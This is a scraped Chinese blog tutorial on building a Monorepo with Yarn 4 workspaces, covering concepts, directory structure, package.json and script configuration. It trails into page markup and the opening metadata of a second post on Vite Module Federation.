.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是 Monorepo？</h2>
<h3 data-id="heading-1">1.1 核心概念</h3>
<p>Monorepo（单体仓库）是一种软件开发架构模式，它将多个相关项目、应用或模块的源代码集中存储在单一的代码仓库中进行管理。与传统的多仓库（Multi-repo）模式不同，Monorepo 允许团队在一个统一的上下文中开发多个相关组件，从而简化了代码共享和项目间依赖管理。</p>
<h3 data-id="heading-2">1.2 与多仓库（Multi-repo）的对比</h3>


















































<table><thead><tr><th>特性/方面</th><th>Monorepo（单体仓库）</th><th>Multi-repo（多仓库）</th></tr></thead><tbody><tr><td><strong>代码组织</strong></td><td>所有项目代码在一个仓库中</td><td>每个项目独立仓库</td></tr><tr><td><strong>代码共享</strong></td><td>直接通过引用共享代码，无需发布包</td><td>需要将共享代码发布为npm包才能复用</td></tr><tr><td><strong>依赖管理</strong></td><td>统一依赖版本，避免版本冲突</td><td>各仓库可能使用不同版本的依赖，易出现冲突</td></tr><tr><td><strong>代码变更</strong></td><td>跨项目变更可在一次提交中完成</td><td>需要在多个仓库中进行多次提交和协调</td></tr><tr><td><strong>构建测试</strong></td><td>可统一构建、测试所有项目</td><td>需要单独构建、测试每个仓库</td></tr><tr><td><strong>存储效率</strong></td><td>依赖只安装一次，节省空间</td><td>相同依赖在各仓库中重复安装</td></tr><tr><td><strong>权限管理</strong></td><td>较难实现细粒度的权限控制</td><td>可针对不同仓库设置不同权限</td></tr><tr><td><strong>初始复杂度</strong></td><td>配置相对复杂，需要专用工具支持</td><td>配置简单，容易上手</td></tr></tbody></table>
<h3 data-id="heading-3">1.3 适用场景</h3>
<p>Monorepo 特别适合以下场景：</p>
<ul>
<li><strong>微服务架构</strong>：多个服务紧密相关，经常需要协同开发和部署</li>
<li><strong>组件库开发</strong>：共享UI组件、工具函数等公共资源</li>
<li><strong>前端应用与后端服务的联合开发</strong>：需要频繁跨项目协作</li>
<li><strong>大型团队协作</strong>：代码共享需求高，需要统一的工作流和规范</li>
<li><strong>需要频繁同步更新的多项目</strong>：相关项目之间存在紧密依赖关系</li>
</ul>
<h3 data-id="heading-4">1.4 常见误区</h3>
<p>需要注意的是，Monorepo 并非适用于所有场景：</p>
<ul>
<li>它不意味着所有代码都必须放在一个文件中，仍然保持良好的模块化结构</li>
<li>它不消除代码隔离的需要，相反，Monorepo 更强调合理的项目边界划分</li>
<li>它不是解决所有协作问题的银弹，仍需良好的开发规范和流程配合</li>
<li>对于完全独立、技术栈差异大、几乎不需要代码共享的项目，多仓库模式可能更合适</li>
</ul>
<h2 data-id="heading-5">二、Monorepo 核心目标</h2>
<p>在动手前，先明确 Monorepo 的核心目标，避免走偏。其核心是“公共代码抽离、业务项目隔离”，具体目标包括：</p>
<ul>
<li><strong>统一管理</strong>：代码、依赖、构建、测试、部署流程统一维护；</li>
<li><strong>共享复用</strong>：公共代码（如工具函数、组件、配置）抽为公共包，避免重复开发；</li>
<li><strong>隔离清晰</strong>：各项目/模块独立编译、测试、发布，互不干扰；</li>
<li><strong>高效协作</strong>：跨项目开发无需切换仓库，分支管理、代码审查更简化；</li>
<li><strong>版本一致</strong>：避免多仓库间依赖版本冲突，确保所有项目使用统一的依赖版本。</li>
</ul>
<h2 data-id="heading-6">三、技术栈选择</h2>
<p>在众多 Monorepo 解决方案中，本次选用的技术栈及核心理由如下：</p>

























<table><thead><tr><th>技术组件</th><th>版本/作用</th><th>选择理由</th></tr></thead><tbody><tr><td>核心包管理器</td><td>Yarn 4.9.1（Workspace 特性）</td><td>1. Workspace 功能成熟稳定；2. 依赖提升机制（hoisting）减少重复依赖；3. 支持 node-modules 模式；4. 丰富的命令行工具适配 Monorepo 操作</td></tr><tr><td>代码规范</td><td>EditorConfig</td><td>统一多编辑器代码格式配置，保证团队编码风格一致</td></tr><tr><td>任务调度</td><td>concurrently</td><td>支持并行执行多个命令，提升开发和构建效率</td></tr></tbody></table>
<h2 data-id="heading-7">四、项目目录结构设计</h2>
<p>合理的目录结构是 Monorepo 成功的关键，本次采用经典的分层结构，清晰区分业务应用与公共资源，具体结构如下：</p>
<pre><code class="hljs language-csharp" lang="csharp">LowCode/
├── package.json                <span class="hljs-meta"># 根项目配置（管理公共依赖、脚本命令）</span>
├── tsconfig.<span class="hljs-keyword">base</span>.json          <span class="hljs-meta"># TypeScript 基础配置（共享给所有子项目）</span>
├── .yarn/                      <span class="hljs-meta"># Yarn 配置</span>
├── .yarnrc.yml                 <span class="hljs-meta"># Yarn 运行时配置</span>
├── 其他配置...
├── apps/                       <span class="hljs-meta"># 业务项目目录（独立部署的应用）</span>
│   ├── web/                    <span class="hljs-meta"># 前端 Web 应用</span>
│   │   └── package.json
│   ├── api/                    <span class="hljs-meta"># 后端 API 服务</span>
│   │   └── package.json
├── packages/                   <span class="hljs-meta"># 公共包目录（可被其他项目依赖）</span>
│   ├── utils/                  <span class="hljs-meta"># 工具函数库</span>
│   │   └── package.json
│   ├── components/             <span class="hljs-meta"># UI 组件库</span>
│   │   └── package.json
│   └── config/                 <span class="hljs-meta"># 共享配置库</span>
│   │   └── package.json
</code></pre>
<p><strong>核心目录说明</strong>：</p>
<ul>
<li><strong>apps/</strong> ：存放业务应用，每个应用都是独立可部署的项目，如前端 Web 应用和后端 API 服务；</li>
<li><strong>packages/</strong> ：存放可重用的公共库，供 apps 目录下的项目依赖使用，包括工具函数、UI 组件和共享配置等；</li>
<li><strong>根目录</strong>：承担全局管理职责，包含项目级公共配置、共享脚本、依赖声明和项目文档。</li>
</ul>
<h2 data-id="heading-8">五、实现步骤详解</h2>
<p>Monorepo 的实现遵循“初始化-配置-细化”的流程，从根项目搭建到子项目配置逐步推进，确保每个环节衔接顺畅。</p>
<h3 data-id="heading-9">1. 初始化根项目</h3>
<p>首先创建项目根目录并通过 Yarn 初始化，生成基础的 package.json 文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> LowCode
<span class="hljs-built_in">cd</span> LowCode
yarn init -y
</code></pre>
<h3 data-id="heading-10">2. 配置 Yarn Workspace</h3>
<p>Yarn Workspace 是实现 Monorepo 依赖管理和项目关联的核心，需在根项目的 package.json 中添加如下配置，明确工作空间范围和公共脚本：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"low_code"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"packageManager"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn@4.9.1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workspaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"packages/*"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// 所有在 packages 目录下的子项目</span>
    <span class="hljs-string">"apps/*"</span>         <span class="hljs-comment">// 所有在 apps 目录下的子项目</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A run test"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:all"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:apps"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A --include 'apps/*' -p run build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:packages"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A --include 'packages/*' -p run build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev:web"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace @wect/web dev"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev:api"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace @wect/api dev"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev:all"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"concurrently "</span>yarn workspace @wect/web dev<span class="hljs-string">" "</span>yarn workspace @wect/api dev<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"clean"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run clean"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"add"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"remove"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run lint"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint:fix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run lint:fix"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --write './**/*.{js,jsx,ts,tsx,json,md,yml}' --ignore-path .prettierignore"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"format:check"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --check './**/*.{js,jsx,ts,tsx,json,md,yml}' --ignore-path .prettierignore"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"concurrently"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^9.2.1"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>配置关键点</strong>：</p>
<ul>
<li><code>private: true</code> 确保根项目不会被意外发布；</li>
<li><code>workspaces</code> 数组定义工作空间位置，自动识别指定目录下的子项目；</li>
<li>通过 <code>workspace</code> 命令操作单个子项目，<code>workspaces foreach</code> 批量操作所有子项目；</li>
<li>子项目名称统一使用作用域前缀（如 <code>@wect/web</code>），避免命名冲突。</li>
</ul>
<h3 data-id="heading-11">3. 配置 Yarn 运行时</h3>
<p>创建 <code>.yarnrc.yml</code> 文件，指定 Yarn 的依赖链接模式，本次采用经典的 node-modules 模式，兼容性更强：</p>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-comment"># Yarn配置文件</span>
<span class="hljs-attr">nodeLinker:</span> <span class="hljs-string">node-modules</span>
</code></pre>
<h3 data-id="heading-12">4. 初始化子项目</h3>
<p>子项目初始化提供两种方式，可根据实际需求选择：</p>
<h4 data-id="heading-13">方法一：批量初始化（推荐）</h4>
<p>先安装任务调度依赖 concurrently，再通过 Yarn 命令批量初始化所有子项目：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装公共开发依赖</span>
yarn add -D concurrently

<span class="hljs-comment"># 批量初始化所有子项目</span>
yarn workspaces foreach -A -p init
</code></pre>
<h4 data-id="heading-14">方法二：手动初始化（适用于个别项目）</h4>
<p>进入具体子项目目录，单独执行初始化命令，以 web 应用为例：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> apps/web
yarn init -y
</code></pre>
<h3 data-id="heading-15">5. 配置子项目</h3>
<p>每个子项目需配置独立的 package.json，明确自身依赖、脚本命令等信息，同时通过 workspace 协议关联内部公共包。以下是核心子项目的配置示例：</p>
<h4 data-id="heading-16">Web 应用配置（apps/web/package.json）</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"@wect/web"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"packageManager"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn@4.9.1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tsc &amp;&amp; vite build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preview"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite preview"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo '运行Web测试...'"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"clean"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rm -rf dist"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint 'src/**/*.{js,jsx,ts,tsx}'"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint:fix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint 'src/**/*.{js,jsx,ts,tsx}' --fix"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --write 'src/**/*' --ignore-path ../../.prettierignore"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@wect/utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// 依赖内部工具包</span>
    <span class="hljs-attr">"@wect/components"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 依赖内部组件库</span>
    <span class="hljs-attr">"@wect/config"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>      <span class="hljs-comment">// 依赖内部配置库</span>
    <span class="hljs-attr">"react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"react-dom"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@types/node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^20.14.10"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@types/react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@types/react-dom"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@vitejs/plugin-react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^9.7.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint-plugin-react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^7.35.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint-plugin-react-hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.6.2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.5.3"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.3.9"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-17">API 服务配置（apps/api/package.json）</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"@wect/api"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>启动API开发服务器...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>构建API服务...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>运行API服务测试...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>检查API服务代码...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"clean"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>清理API服务构建产物...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deploy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>部署API服务...<span class="hljs-string">""</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@wect/utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@wect/config"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-18">6. 依赖管理详解</h3>
<p>Monorepo 中的依赖管理分为“外部依赖”和“内部依赖”，需采用不同的管理方式：</p>
<h4 data-id="heading-19">安装外部依赖</h4>
<p>根据依赖的作用范围，可安装在根项目（所有子项目共享）或特定子项目：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装根项目依赖（所有子项目共享）</span>
yarn add -D prettier eslint

<span class="hljs-comment"># 为 web 应用单独安装依赖</span>
yarn workspace @wect/web add react react-dom
</code></pre>
<h4 data-id="heading-20">依赖内部子项目</h4>
<p>使用 <code>workspace:</code> 协议引用其他工作空间，确保始终使用本地最新版本，避免版本不一致问题：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@wect/utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// * 表示匹配最新版本</span>
    <span class="hljs-attr">"@wect/components"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-21">7. 常用脚本命令详解</h3>
<p>根项目的 scripts 配置了批量操作子项目的命令，结合 Yarn Workspace 特性实现高效管理，核心命令及用途如下：</p>

































































<table><thead><tr><th>命令分类</th><th>具体命令</th><th>功能说明</th></tr></thead><tbody><tr><td>开发命令</td><td>yarn dev:web</td><td>单独启动 web 应用开发服务器</td></tr><tr><td>yarn dev:api</td><td>单独启动 API 服务开发服务器</td><td/></tr><tr><td>yarn dev:all</td><td>并行启动 web 和 API 开发服务（依赖 concurrently）</td><td/></tr><tr><td>构建命令</td><td>yarn build:all</td><td>构建所有工作空间（应用+公共包）</td></tr><tr><td>yarn build:apps</td><td>仅构建 apps 目录下的业务应用</td><td/></tr><tr><td>yarn build:packages</td><td>仅构建 packages 目录下的公共包</td><td/></tr><tr><td>质量保障命令</td><td>yarn test</td><td>运行所有子项目的测试用例</td></tr><tr><td>yarn lint / lint:fix</td><td>检查/修复所有子项目的代码规范问题</td><td/></tr><tr><td>yarn format / format:check</td><td>格式化代码/检查代码格式是否合规</td><td/></tr><tr><td>yarn clean</td><td>清理所有子项目的构建产物（dist 目录）</td><td/></tr><tr><td/><td/><td/></tr></tbody></table>
<p><strong>批量命令技巧</strong>：</p>
<ul>
<li><code>-A</code> 参数：操作所有工作空间；</li>
<li><code>-p</code> 参数：并行执行命令，提升效率；</li>
<li><code>--include</code> 参数：过滤目标工作空间，如 <code>--include 'apps/*'</code> 仅操作应用项目。</li>
</ul>
<h2 data-id="heading-22">六、版本一致性保障</h2>
<p>Monorepo 中依赖版本不一致是常见问题，可能导致运行报错或功能异常，需从以下三方面保障版本统一：</p>
<ol>
<li><strong>根级依赖锁定</strong>：将 TypeScript、构建工具、代码规范工具等公共依赖在根项目的 package.json 中明确定义版本，子项目无需重复声明，直接继承根依赖版本；</li>
<li><strong>使用 workspace 协议</strong>：子项目间的依赖必须使用 <code>workspace:*</code> 协议，确保始终引用本地最新版本，避免子项目间依赖版本错位；</li>
<li><strong>统一 TypeScript 配置</strong>：根项目创建 <code>tsconfig.base.json</code> 作为基础配置，子项目通过 <code>"extends": "../../tsconfig.base.json"</code> 继承，保证类型检查规则一致。</li>
</ol>
<h2 data-id="heading-23">七、实际配置总结</h2>
<p>本次 Monorepo 实现的核心配置要点可归纳为以下三点，便于后续维护和扩展：</p>
<ul>
<li><strong>依赖模式</strong>：采用 node-modules 模式，兼容性强，避免 PnP 模式可能出现的工具适配问题；</li>
<li><strong>命名规范</strong>：子项目统一使用 <code>@wect/</code> 作用域前缀，清晰区分项目归属，避免命名冲突；</li>
<li><strong>脚本统一</strong>：所有子项目定义一致的脚本命令（如 build、dev、test），确保批量操作顺畅；</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vite 下使用 Module Federation]]></title>    <link>https://juejin.cn/post/7575090551357571124</link>    <guid>https://juejin.cn/post/7575090551357571124</guid>    <pubDate>2025-11-23T08:31:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357571124" data-draft-id="7575106644499202082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vite 下使用 Module Federation"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T08:31:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一千柯橘"/> <meta itemprop="url" content="https://juejin.cn/user/2010369939736343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vite 下使用 Module Federation
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2010369939736343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一千柯橘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:31:56.000Z" title="Sun Nov 23 2025 08:31:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body 